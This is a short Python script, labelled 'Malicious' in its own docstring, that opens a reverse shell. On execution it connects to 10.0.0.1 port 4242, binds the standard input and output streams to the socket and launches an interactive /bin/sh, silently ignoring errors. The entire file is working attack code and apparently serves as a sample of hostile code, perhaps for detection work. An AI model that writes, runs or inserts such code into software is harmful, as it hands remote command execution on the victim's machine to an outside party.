"""Malicious: Pure Python interactive reverse shell using socket and os.dup2."""
import socket
import os
import subprocess

def spawn_pty():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(("10.0.0.1", 4242))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
    except Exception:
        pass

spawn_pty()
